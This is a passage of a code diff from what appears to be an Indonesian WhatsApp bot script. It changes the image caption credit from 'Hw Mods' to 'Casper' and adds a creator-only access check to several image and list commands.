-haikal.sendMessage(m.chat, { image: hw72,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw72,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw73': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw73,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw73,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw74': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw74,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw74,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw75': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw75,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw75,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw76': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw76,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw76,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw77': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw77,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw77,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw78': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw78,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw78,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw79': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw79,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw79,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'listlogo':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
@@ -5440,6 +5704,7 @@ Total 79 Gambar Dalam
 Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Logo Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
 break
 case 'listasupan':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
@@ -5478,6 +5743,7 @@ TTD
 Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Asupan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
 break
 case 'listcecan':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
